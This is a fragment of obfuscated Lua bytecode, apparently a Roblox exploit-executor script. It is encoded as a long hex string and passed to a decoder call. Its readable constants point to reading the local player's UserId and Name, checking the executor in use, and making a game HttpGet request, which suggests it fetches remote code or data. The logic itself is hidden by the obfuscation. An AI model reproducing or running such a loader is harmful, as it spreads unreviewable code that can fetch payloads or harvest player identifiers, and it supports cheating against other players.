004C6F63616C506C6179657203023Q005F4703053Q007072696E74030C3Q00E29C97204661696C65643A2003083Q00746F737472696E6703103Q006964656E746966796578656375746F7203043Q007761697403063Q0055736572496403043Q004E616D6500F34Q00257Q00122Q000100013Q00202Q00010001000200122Q000200013Q00202Q00020002000300122Q000300013Q00202Q00030003000400122Q000400053Q00062Q0004000B00010001002Q043Q000B0001001227000400063Q002011000500040007001227000600083Q002011000600060009001227000700083Q00201100070007000A00061000083Q000100062Q000C3Q00074Q000C3Q00014Q000C3Q00054Q000C3Q00024Q000C3Q00034Q000C3Q00064Q000F000900083Q00122Q000A000C3Q00122Q000B000D6Q0009000B000200104Q000B00094Q000900083Q00122Q000A000F3Q00122Q000B00106Q0009000B000200104Q000E00092Q000F000900083Q00122Q000A00123Q00122Q000B00136Q0009000B000200104Q001100094Q000900083Q00122Q000A00153Q00122Q000B00166Q0009000B000200104Q001400092Q000F000900083Q00122Q000A00183Q00122Q000B00196Q0009000B000200104Q001700094Q000900083Q00122Q000A001B3Q00122Q000B001C6Q0009000B000200104Q001A00092Q000F000900083Q00122Q000A001E3Q00122Q000B001F6Q0009000B000200104Q001D00094Q000900083Q00122Q000A00213Q00122Q000B00226Q0009000B000200104Q002000092Q000F000900083Q00122Q000A00243Q00122Q000B00256Q0009000B000200104Q002300094Q000900083Q00122Q000A00273Q00122Q000B00286Q0009000B000200104Q002600092Q000C000900083Q001231000A002A3Q001231000B002B4Q002C0009000B00020010353Q00290009001231000900294Q001D000A00133Q002622000900540001002C002Q043Q005400012Q001D000D000F3Q0012310009002D3Q002622000900580001002D002Q043Q005800012Q001D001000123Q0012310009002E3Q0026220009005D00010029002Q043Q005D0001001231000A00294Q001D000B000C3Q0012310009002C3Q002622000900500001002E002Q043Q005000012Q001D001300133Q002622000A008300010029002Q043Q00830001001231001400293Q0026220014007B0001002C002Q043Q007B000100062B000C007900010001002Q043Q00790001001231001500294Q001D001600163Q0026220015006900010029002Q043Q00690001001231001600293Q0026220016006C00010029002Q043Q006C0001001231001700293Q0026220017006F00010029002Q043Q006F00010012270018002F3Q00201100193Q00292Q00140018000200012Q00033Q00013Q002Q043Q006F0001002Q043Q006C0001002Q043Q00790001002Q043Q00690001001231000A002C3Q002Q043Q008300010026220014006300010029002Q043Q00630001001231000B00303Q001215001500313Q00202Q00150015003200202Q000C0015003300122Q0014002C3Q00044Q00630001002622000A009D00010026002Q043Q009D0001001227001400343Q00201100153Q00262Q001900140014001500061000150001000100012Q000C3Q00114Q00290014000200152Q000C001300154Q000C001200143Q00061C0012009500013Q002Q043Q00950001001227001400353Q00203200153Q00234Q001600136Q0015001500164Q00140002000100044Q00F10001001227001400353Q00122A001500363Q00122Q001600376Q001700136Q0016000200024Q0015001500164Q00140002000100044Q00F10001002622000A00BC0001002D002Q043Q00BC0001001231001400293Q002622001400AB0001002C002Q043Q00AB0001001227001500353Q00200E00163Q002000122Q001700376Q0018000D6Q0017000200024Q0016001600174Q00150002000100122Q000A002E3Q00044Q00BC0001000E16002900A000010014002Q043Q00A00001001227001500383Q00061C001500B400013Q002Q043Q00B40001001227001500384Q001F001500010002000623000F00B500010015002Q043Q00B50001002011000F3Q001D001227001500353Q00203400163Q001A4Q0017000E6Q0016001600174Q00150002000100122Q0014002C3Q00044Q00A00001002622000A00D20001002C002Q043Q00D20001001231001400293Q002622001400C900010029002Q043Q00C90001001227001500393Q0012310016002C4Q00140015000200010020110015000C003A000623000D00C800010015002Q043Q00C80001001231000D00293Q0012310014002C3Q002622001400BF0001002C002Q043Q00BF00010020110015000C003B000623000E00CF00010015002Q043Q00CF0001002011000E3Q0017001231000A002D3Q002Q043Q00D20001002Q043Q00BF0001002622000A00600001002E002Q043Q00600001001231001400293Q002622001400DC0001002C002Q043Q00DC00012Q000C0015000B4Q000C001600104Q0028001100150016001231000A00263Q002Q043Q00600001002622001400D500010029002Q043Q00D50001001227001500353Q00202400163Q00144Q0017000F6Q0016001600174Q00150002000100202Q00153Q001100122Q001600376Q0017000D6Q00160002000200202Q00173Q000E4Q0018000E3Q00201100193Q000B2Q000C001A000F4Q002800100015001A0012310014002C3Q002Q043Q00D50001002Q043Q00600001002Q043Q00F10001002Q043Q005000012Q000700096Q00033Q00013Q00023Q00023Q00026Q00F03F026Q00704002264Q000900025Q00122Q000300016Q00045Q00122Q000500013Q00042Q0003002100012Q001A00076Q002E000800026Q000900016Q000A00026Q000B00036Q000C00046Q000D8Q000E00063Q00202Q000F000600014Q000C000F6Q000B3Q00024Q000C00036Q000D00046Q000E00016Q000F00016Q000F0006000F00102Q000F0001000F4Q001000016Q00100006001000102Q00100001001000202Q0010001000014Q000D00106Q000C8Q000A3Q000200202Q000A000A00024Q0009000A6Q00073Q00010004170003000500012Q001A000300054Q000C000400024Q0012000300044Q002D00036Q00033Q00017Q00023Q0003043Q0067616D6503073Q00482Q747047657400063Q00120D3Q00013Q00206Q00024Q00029Q0000029Q008Q00017Q00",v9(),...);
